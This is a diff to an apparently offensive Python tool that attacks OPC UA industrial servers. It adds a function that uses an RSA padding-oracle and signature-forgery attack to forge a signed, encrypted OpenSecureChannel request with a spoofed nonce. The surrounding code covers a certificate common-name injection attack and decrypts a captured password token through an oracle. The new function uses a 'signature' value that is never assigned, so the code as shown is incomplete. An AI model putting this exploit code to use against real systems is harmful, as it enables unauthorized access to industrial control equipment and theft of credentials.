@@ -27,6 +27,9 @@ def log_success(msg : str):
 # Self signed certificate template (DER encoded) used for path injection attack.
 SELFSIGNED_CERT_TEMPLATE = b64decode('MIIE6TCCA9GgAwIBAgIKEtz1iOEt2W2zvjANBgkqhkiG9w0BAQsFADB9MSAwHgYKCZImiZPyLGQBGRMQdHRlcnZvb3J0LXNlY3VyYTEXMBUGA1UEChMOT1BDIEZvdW5kYXRpb24xEDAOBgNVBAgTB0FyaXpvbmExCzAJBgNVBAYTAlVTMSEwHwYDVQQDExhDb25zb2xlIFJlZmVyZW5jZSBDbGllbnQwHhcNMjQwMzEwMDAwMDAwWhcNMjUwMzEwMDAwMDAwWjB9MSAwHgYKCZImiZPyLGQBGRMQdHRlcnZvb3J0LXNlY3VyYTEXMBUGA1UEChMOT1BDIEZvdW5kYXRpb24xEDAOBgNVBAgTB0FyaXpvbmExCzAJBgNVBAYTAlVTMSEwHwYDVQQDExhDb25zb2xlIFJlZmVyZW5jZSBDbGllbnQwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCVZar5gJGUm88hIcuTautbRnZ/TvBx4nezaab9djeHTCmx0EezCS/2LSAnCv3uYumvpvd5s03eEPfQ0s26wKqgUj4eKCn2XTukaORJu/jb9mGoD40bRwrMDMxW5CpHZ0xFgnyKHb3QbzzvwFwGTx1bXGz9xMe+J9r5mNzsHVZ46aVOScOrF44ZyRwbNkWAhIiXKgrJoHLKA6LN6iBA+kkKTZc7q+GsoEM5O4pwAXATqMGmsFaV/I05x7CckrNgUVZfT2PwwRMZ1hKITu1Z/Jti6dUzxyF5qWFoL5TDNKFQYPtR13LaQpQkzUqkw8VkUeBiT+hFsiT4GkYuo9Emv9TxAgMBAAGjggFpMIIBZTAMBgNVHRMBAf8EAjAAMB0GA1UdDgQWBBTJcPReZqL1YOptopao2c+m/nvp8DCBsQYDVR0jBIGpMIGmgBTJcPReZqL1YOptopao2c+m/nvp8KGBgaR/MH0xIDAeBgoJkiaJk/IsZAEZExB0dGVydm9vcnQtc2VjdXJhMRcwFQYDVQQKEw5PUEMgRm91bmRhdGlvbjEQMA4GA1UECBMHQXJpem9uYTELMAkGA1UEBhMCVVMxITAfBgNVBAMTGENvbnNvbGUgUmVmZXJlbmNlIENsaWVudIIKEtz1iOEt2W2zvjAOBgNVHQ8BAf8EBAMCAvQwIAYDVR0lAQH/BBYwFAYIKwYBBQUHAwEGCCsGAQUFBwMCMFAGA1UdEQRJMEeGM3Vybjp0dGVydm9vcnQtc2VjdXJhOlVBOlF1aWNrc3RhcnRzOlJlZmVyZW5jZUNsaWVudIIQdHRlcnZvb3J0LXNlY3VyYTANBgkqhkiG9w0BAQsFAAOCAQEAjw9zu/9SPD6iOex67jS/xaKc7JhWTa7JBZjY7xPYEhnxSwkyMW7I8AkAK/d5w9/WJl0I2dTlZ8ftKKUFjOV7TrNhT2TNuYVqq9OZQhJYKEPmfUhb5oAHqGLWCixyDfiez69hLii0QT5qVYi5rR5S+C0KQ3uNXRt3subM3edND9LSuUc3DTfc2r6ZFQ9SR0Y0BCf3gLyB7VPrVKxpKspNjTv/5y3dSI4q1VNA+q8OaXxSVUVlTN/Nlg8euWELiHeGGHu3EKqje1swN4cLXoSWfhn6qW/x/PvcUZMvK2xrukrR1f1SR/R9gZm0SKeEEq0nRrn1ASPB5sMtOWPxdruSKA==')
 
+# Fixed clientNonce value used within spoofed OpenSecureChannel requests.
+SPOOFED_OPN_NONCE = unhexlify('1337133713371337133713371337133713371337133713371337133713371337')
+
 # Thrown when an attack was not possible due to a configuration that is not vulnerable to it (other exceptions indicate 
 # unexpected errors, which can have all kinds of causes). 
 class AttackNotPossible(Exception):
@@ -947,7 +950,7 @@ def inject_cn_attack(url : str, cn : str, second_login : bool, demo : bool):
   
   mycert, privkey = selfsign_cert(SELFSIGNED_CERT_TEMPLATE, cn, datetime.now() + timedelta(days=100))
   log(f'Generated self-signed certificate with CN {cn}.')
-  log(f'SHA-1 thumbprint: {hexlify(certificate_thumbprint(mycert))}')
+  log(f'SHA-1 thumbprint: {hexlify(certificate_thumbprint(mycert)).decode().upper()}')
   
   endpoints = get_endpoints(url)
   log(f'Server advertises {len(endpoints)} endpoints.')
@@ -1024,6 +1027,50 @@ def inject_cn_attack(url : str, cn : str, second_login : bool, demo : bool):
     demonstrate_access(*chantoken, ep.securityPolicyUri)
     
 
+def forge_opn_request(endpoint : endpointDescription.Type, opn_oracle : bool, password_oracle : bool) -> OpenSecureChannelMessage:
+  # Use the padding oracle attack to forge a (reusable) signed and encrypted OPN request.
+  sp = endpoint.securityPolicyUri
+  pk = certificate_publickey(endpoint.serverCertificate)
+  assert sp != SecurityPolicy.NONE
+  
+  plaintext = encodedConversation.to_bytes(encodedConversation.create(
+    sequenceNumber=1,
+    requestId=1,
+    requestOrResponse=openSecureChannelRequest.to_bytes(openSecureChannelRequest.create(
+      requestHeader=simple_requestheader(),
+      clientProtocolVersion=0,
+      requestType=SecurityTokenRequestType.ISSUE,
+      securityMode=endpoint.securityMode,
+      clientNonce=SPOOFED_OPN_NONCE,
+      requestedLifetime=3600000,
+    ))
+  ))
+  msg = OpenSecureChannelMessage(
+    secureChannelId=0,
+    securityPolicyUri=sp,
+    senderCertificate=client_certificate,
+    receiverCertificateThumbprint=certificate_thumbprint(endpoint.serverCertificate),
+    encodedPart=plaintext
+  )
+  padded_msg = pkcs7_pad(msg.to_bytes(), rsa_plainblocksize(sp, pk))
+  
+  log('First, trying sigforge attack to produce OPN signature.')
+  hasher = 'sha1' if sp in [SecurityPolicy.BASIC128RSA15, SecurityPolicy.BASIC256] else 'sha256'
+  forge_signature_attack(endpoint.endpointUrl, padded_msg, opn_oracle, password_oracle, hasher)
+  
+  msg.encodedPart = b''
+  ciphertext = rsa_ecb_encrypt(sp, pk, padded_msg[len(msg.to_bytes()):] + signature)
+  msg.encodedPart = ciphertext
+  log(f'Message bytes after applying encryption: {hexlify(msg.to_bytes()).decode()}')
+  
+  return msg
+  
+# def bypass_opn(endpoint : endpointDescription.Type, opn_oracle : bool, password_oracle : bool) -> ChannelState:
+#   # Attempts to set up a security channel without knowing the private key, by exploiting a padding oracle twice.
+#   .....
+
+    
+
 def oracletest():  
   # Password token:
   todecrypt = unhexlify('9e82001c5a9b0d4ec8ed921af69659d8a3c8909bdb3be7bbf2f09a2321256deda98779fe8c182f476b06cf9592f2974b93a04fdbce82db34c2985c59ab71cce0f0987a35f2a4e0958411d40de4073ba00d223e5332ecaab0d5a850a1c97610cb2e42c7675d6a8eb3319ba95aabbed51014687bdf0edd417b47df2b4f348b6539ed1aa7bae5a4bd76ffe475a6d0ea54e51399996485c582615f55296411417f7c6db5aa8796653c47e503a00ce72a7e96e7c69ac52f5f200153cb585c6dc4119962ac004433da24f2347e75ee5fda60b507fde6c9197ad7f0aca65f3b6f91b51c8b0b501549aa10368ae7c4a2e2aeee1bb81bff8e3e6a9be7aa09b999ac641bc7')
@@ -1038,7 +1085,7 @@ def oracletest():
   oracle = PasswordPaddingOracle(ep)
   # print(repr(oracle.query(todecrypt)))
   # print(padding_oracle_quality(ep.serverCertificate, oracle)) 
-  print(hexlify(rsa_decryptor(oracle, ep.serverCertificate, todecrypt)))  
+  print(hexlify(rsa_decryptor(oracle, ep.serverCertificate, todecrypt)))
   
 
 # if __name__ == '__main__':
